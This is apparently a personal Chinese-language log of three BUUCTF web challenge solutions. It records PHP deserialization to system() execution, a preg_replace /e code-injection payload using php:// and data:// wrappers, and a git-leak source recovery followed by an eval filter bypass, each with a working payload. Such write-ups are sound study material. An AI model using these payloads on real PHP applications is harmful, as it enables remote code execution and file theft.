编号      日期                 题目                    平台         介绍
 1     2026/4/27      [网鼎杯 2020 朱雀组]phpweb      BUUCTF        点开页面burp抓包，上传参数分别是file_get_contents和index.php，得到源码，可以看到源码屏蔽了system之类的带有恶意的代码注入，同时
                                                                   index.php代码定义了一个Test类，这个类有个__destruct方法，方法实现了运行函数的功能，这个destruct功能没有过滤system之类的，所以思路
                                                                   就是上传的参数是unserialize和一个序列化对象的字符串，字符串里面的成员变量是func=system，p=ls /或者find / -iname *flag*，成功


2      2026/4/30     [BJDCTF2020]ZJCTF，不过如此      BUUCTF        页面一开始给了PHP代码，只用输入参数text=data://text/plain,I have a dream&file=php://filter/convert.base64-                                                                                       encode/resource=next.php，因为text使用的强类型比较加file_get_contents，file使用include。
                                                                   下一步看到 return preg_replace('/(' . $re . ')/ei','strtolower("\\1")',$str); 其中re是get参数，str是参数对应的值，因为有/e，
                                                                   他把第二个参数当作php代码执行，又因为\1和（ $re），所以可以传入.*参数对应${phpinfo()}值，这样就可以解析，但是因为Get请求的参数名
                                                                   中有.号会转换成下划线，所以使用 \S*=${phpinfo()}，根据这个原理最终Payload：?\S*=${getFlag()}&cmd=system('cat /flag'); 


3       2026/5/6        [GXYCTF2019]禁止套娃          BUUCTF        页面没有任何提示，使用burpSuite抓包没有发现什么敏感的信息，只得到php的版本，暂时不考虑搜索相应CVE。使用dirseach穷举页面，发现了.git/
                                                                   字段，可以知道这是git泄露，我们可以使用GitHack或者GitTools得到源码。源码index.php中有主要代码：
                                                                           if (!preg_match('/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i', $_GET['exp'])) {
                                                                            if(';' === preg_replace('/[a-z,_]+\((?R)?\)/', NULL, $_GET['exp'])) {
                                                                             if (!preg_match('/et|na|info|dec|bin|hex|oct|pi|log/i', $_GET['exp'])) {
                                                                                // echo $_GET['exp'];
                                                                                @eval($_GET['exp']);
                                                                    在第二个if语句中，可以知道，只要传入scandir(pos());之类的结构就可以绕过。至于第一个和第三个if就是普通的正则表达式。、
                                                                    结论：使用?exp=highlight_file(next(array_reverse(scandir(pos(localeconv()))))); 
                                                                    原因：localeconv返回的第一个元素是 ‘.’ ；scandir函数列举当前目录的文件；由于知道目标文件在当前文件夹的倒数第二个，所以使用next加
                                                                    array_reverse；之后高亮显示
